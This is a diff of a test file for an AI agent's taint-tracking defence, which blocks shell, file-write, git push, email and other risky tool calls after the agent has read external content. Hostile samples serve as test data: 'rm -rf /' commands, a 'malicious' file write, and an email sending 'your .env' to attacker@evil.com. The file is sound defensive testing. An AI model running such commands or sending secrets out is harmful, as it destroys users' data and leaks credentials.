@@ -1,6 +1,7 @@
 /**
  * Test taint tracking security feature
- * Verifies that dangerous capabilities are blocked after fetching external content
+ * Verifies that dangerous capabilities are blocked after fetching external content.
+ * Runs through executeNativeToolCall, the one entry every live tool call uses.
  */
 
 import { describe, it, expect, beforeEach, beforeAll, vi } from 'vitest';
@@ -24,10 +25,16 @@ vi.mock('child_process', async (importOriginal) => {
   return { ...actual, exec, execFile, default: { ...actual, exec, execFile } };
 });
 
-import { capabilityExecutor, TAINTING_CAPABILITIES } from '../../src/engine/5-tool-loop/execute.js';
+import { executeNativeToolCall, TAINTING_CAPABILITIES } from '../../src/engine/5-tool-loop/execute.js';
 import { capabilityBootstrap } from '../../src/engine/5-tool-loop/register-tools.js';
 import { capabilityRegistry, TOOL_ALIASES } from '../../src/engine/5-tool-loop/registry.js';
-import { OrchestrationContext, ExtractedCapability } from '../../src/engine/2-turn/types.js';
+import { OrchestrationContext } from '../../src/engine/2-turn/types.js';
+
+interface Call {
+  name: string;
+  action: string;
+  params: Record<string, unknown>;
+}
 
 describe('Taint sets name only registered canonical tools', () => {
   beforeAll(() => {
@@ -64,20 +71,16 @@ describe('Taint Tracking Security', () => {
     };
   });
 
+  // One native tool call; the result row is what the loop records for the call.
+  async function run(call: Call) {
+    const text = await executeNativeToolCall(context, call);
+    const last = context.results[context.results.length - 1];
+    return { text, success: last.success, error: last.error, capability: last.capability };
+  }
+
   describe('when context is NOT tainted', () => {
     it('should allow shell capability', async () => {
-      const shellCap: ExtractedCapability = {
-        name: 'shell',
-        action: 'exec',
-        params: { command: 'echo hello' },
-        priority: 0,
-      };
-
-      const result = await capabilityExecutor.executeCapability(
-        shellCap,
-        context,
-        (cap, err) => `Error: ${err}`
-      );
+      const result = await run({ name: 'shell', action: 'exec', params: { command: 'echo hello' } });
 
       // Should attempt execution (may fail for other reasons, but not taint block).
       // child_process is mocked above, so it now actually succeeds instead of failing on docker.
@@ -94,109 +97,59 @@ describe('Taint Tracking Security', () => {
     });
 
     it('should block shell capability', async () => {
-      const shellCap: ExtractedCapability = {
-        name: 'shell',
-        action: 'exec',
-        params: { command: 'rm -rf /' },
-        priority: 0,
-      };
-
-      const result = await capabilityExecutor.executeCapability(
-        shellCap,
-        context,
-        (cap, err) => `Error: ${err}`
-      );
+      const result = await run({ name: 'shell', action: 'exec', params: { command: 'rm -rf /' } });
 
       expect(result.success).toBe(false);
       expect(result.error).toContain('SECURITY');
       expect(result.error).toContain('tainted');
       expect(result.error).toContain('moltbook:feed');
+      // The model sees the block as an Error: result, not a thrown failure.
+      expect(result.text.startsWith('Error: ')).toBe(true);
+      expect(result.text).toContain('SECURITY');
     });
 
     it('should block filesystem write but allow read', async () => {
-      const writeCap: ExtractedCapability = {
+      const writeResult = await run({
         name: 'filesystem',
         action: 'write',
         params: { path: '/tmp/evil.txt', content: 'malicious' },
-        priority: 0,
-      };
-
-      const writeResult = await capabilityExecutor.executeCapability(
-        writeCap,
-        context,
-        (cap, err) => `Error: ${err}`
-      );
+      });
 
       expect(writeResult.success).toBe(false);
       expect(writeResult.error).toContain('SECURITY');
 
       // Read should be allowed (read_file: the real action; until 2026-11-17 the exemption list
       // named 'read', which isn't one, so read_file was blocked)
-      const readCap: ExtractedCapability = {
+      const readResult = await run({
         name: 'filesystem',
         action: 'read_file',
         params: { path: '/tmp/test.txt' },
-        priority: 0,
-      };
-
-      const readResult = await capabilityExecutor.executeCapability(
-        readCap,
-        context,
-        (cap, err) => `Error: ${err}`
-      );
+      });
 
       // Should not be blocked by taint (may fail for other reasons)
       expect(readResult.error || '').not.toContain('SECURITY');
       expect(readResult.error || '').not.toContain('tainted');
+      expect(readResult.text).not.toContain('SECURITY');
     });
 
     it('should block git push but allow git status', async () => {
-      const pushCap: ExtractedCapability = {
-        name: 'git',
-        action: 'push',
-        params: {},
-        priority: 0,
-      };
-
-      const pushResult = await capabilityExecutor.executeCapability(
-        pushCap,
-        context,
-        (cap, err) => `Error: ${err}`
-      );
+      const pushResult = await run({ name: 'git', action: 'push', params: {} });
 
       expect(pushResult.success).toBe(false);
       expect(pushResult.error).toContain('SECURITY');
 
       // Status should be allowed
-      const statusCap: ExtractedCapability = {
-        name: 'git',
-        action: 'status',
-        params: {},
-        priority: 0,
-      };
-
-      const statusResult = await capabilityExecutor.executeCapability(
-        statusCap,
-        context,
-        (cap, err) => `Error: ${err}`
-      );
+      const statusResult = await run({ name: 'git', action: 'status', params: {} });
 
       expect(statusResult.error || '').not.toContain('SECURITY');
     });
 
     it('should allow calculator capability (non-dangerous)', async () => {
-      const calculatorCap: ExtractedCapability = {
+      const result = await run({
         name: 'calculator',
         action: 'calculate',
         params: { expression: '2 + 2' },
-        priority: 0,
-      };
-
-      const result = await capabilityExecutor.executeCapability(
-        calculatorCap,
-        context,
-        (cap, err) => `Error: ${err}`
-      );
+      });
 
       // Should not be blocked by taint
       expect(result.error || '').not.toContain('SECURITY');
@@ -206,39 +159,28 @@ describe('Taint Tracking Security', () => {
     it('blocks sandbox:exec and sandbox writes by canonical name, allows sandbox reads', async () => {
       // read_pane is a pure read since 2026-11-17 (tool-policy.test.ts lists the change).
       for (const action of ['exec', 'send', 'replace', 'insert', 'delete', 'split']) {
-        const blocked = await capabilityExecutor.executeCapability(
-          { name: 'sandbox', action, params: { command: 'rm -rf /', file: '/x' }, priority: 0 },
-          context,
-          (cap, err) => `Error: ${err}`
-        );
+        const blocked = await run({
+          name: 'sandbox',
+          action,
+          params: { command: 'rm -rf /', file: '/x' },
+        });
         expect(blocked.success, `sandbox:${action}`).toBe(false);
         expect(blocked.error, `sandbox:${action}`).toContain('SECURITY');
       }
 
       // The old edit:read (now read_file) was never taint-blocked; still isn't.
-      const read = await capabilityExecutor.executeCapability(
-        { name: 'edit', action: 'read', params: { file: '/workspace/x' }, priority: 0 },
-        context,
-        (cap, err) => `Error: ${err}`
-      );
+      const read = await run({ name: 'edit', action: 'read', params: { file: '/workspace/x' } });
       expect(read.capability.name).toBe('sandbox');
       expect(read.capability.action).toBe('read_file');
       expect(read.error || '').not.toContain('SECURITY');
     });
 
     it('should block email capability', async () => {
-      const emailCap: ExtractedCapability = {
+      const result = await run({
         name: 'email',
         action: 'send',
         params: { to: 'attacker@evil.com', subject: 'secrets', body: 'your .env' },
-        priority: 0,
-      };
-
-      const result = await capabilityExecutor.executeCapability(
-        emailCap,
-        context,
-        (cap, err) => `Error: ${err}`
-      );
+      });
 
       expect(result.success).toBe(false);
       expect(result.error).toContain('SECURITY');
@@ -256,42 +198,21 @@ describe('Taint Tracking Security', () => {
       ['mention_proxy', 'create'],
       ['discord-ui', 'buttons'],
     ])('should block %s:%s when tainted', async (name, action) => {
-      const cap: ExtractedCapability = { name, action, params: {}, priority: 0 };
-      const result = await capabilityExecutor.executeCapability(
-        cap,
-        context,
-        (c, err) => `Error: ${err}`
-      );
+      const result = await run({ name, action, params: {} });
       expect(result.success).toBe(false);
       expect(result.error).toContain('SECURITY');
       expect(result.error).toContain('tainted');
     });
 
     it('still allows discord-moderation:escalate and proactive-dm:status (harmless reads)', async () => {
-      const escalate: ExtractedCapability = {
+      const escalateResult = await run({
         name: 'discord-moderation',
         action: 'escalate',
         params: { reason: 'test' },
-        priority: 0,
-      };
-      const escalateResult = await capabilityExecutor.executeCapability(
-        escalate,
-        context,
-        (c, err) => `Error: ${err}`
-      );
+      });
       expect(escalateResult.error || '').not.toContain('SECURITY');
 
-      const status: ExtractedCapability = {
-        name: 'proactive-dm',
-        action: 'status',
-        params: {},
-        priority: 0,
-      };
-      const statusResult = await capabilityExecutor.executeCapability(
-        status,
-        context,
-        (c, err) => `Error: ${err}`
-      );
+      const statusResult = await run({ name: 'proactive-dm', action: 'status', params: {} });
       expect(statusResult.error || '').not.toContain('SECURITY');
       expect(statusResult.error || '').not.toContain('tainted');
     });
